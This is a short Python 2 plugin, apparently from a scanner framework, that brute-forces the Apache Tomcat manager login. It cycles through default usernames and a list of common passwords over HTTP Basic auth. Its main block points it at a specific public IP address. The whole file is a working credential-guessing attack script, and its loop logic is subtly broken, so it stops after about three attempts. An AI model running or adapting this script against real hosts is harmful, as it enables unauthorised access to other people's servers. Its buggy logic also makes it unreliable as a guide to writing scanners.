#coding:utf-8
#author:wolf@future-sec
import urllib2
import base64,re
from t import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        timeout=10
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        res=None
        res_code=0
        res_html=''
        error_i=0
        flag_list=['Application Manager','Welcome']
#         user_list=['admin']
#         pass_list=['admin','']
        user_list=['admin','manager','tomcat','apache','root']
        pass_list=['admin','','123456','12345678','123456789','admin123','123123','admin888','password','admin1','administrator','8888888','123123','manager','tomcat','apache','root']
              
        
        
        for user in user_list:
            for password in pass_list:
                try:
                    
                    login_url = target_url+'/manager/html'
                    request = urllib2.Request(login_url)
                    auth_str_temp=user+':'+password
                    auth_str=base64.b64encode(auth_str_temp)
                    request.add_header('Authorization', 'Basic '+auth_str)
                    res = urllib2.urlopen(request,timeout=timeout)
                    res_code = res.code
                    res_html = res.read()
                except urllib2.HTTPError,e:
                    print 1
                    res_code = e.code
                    res_html = e.read()
                except urllib2.URLError,e:


                    continue
                except:

                    break
                finally:
                    error_i+=1

                    if res is not None:
                        res.close()
                        del res
                    if error_i >= 3:
                        return result

                if int(res_code) == 404:
                    return result
                if int(res_code) == 401 or int(res_code) == 403:
                    continue
                info=''
                for flag in flag_list:
                    if flag in res_html:

                        info = '%s Tomcat Weak password %s:%s'%(login_url,user,password)

                    

                        result['result']=True
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['type']='Tomcat Weak password'
                        result['VerifyInfo']['URL'] =target_url
                        result['VerifyInfo']['payload']=login_url
                        result['VerifyInfo']['result'] =info
                        result['VerifyInfo']['level'] = 'hole'
                        return result             
                return result
        return result






           

if __name__ == '__main__':
    print P().verify(ip='113.105.74.144',port='80')      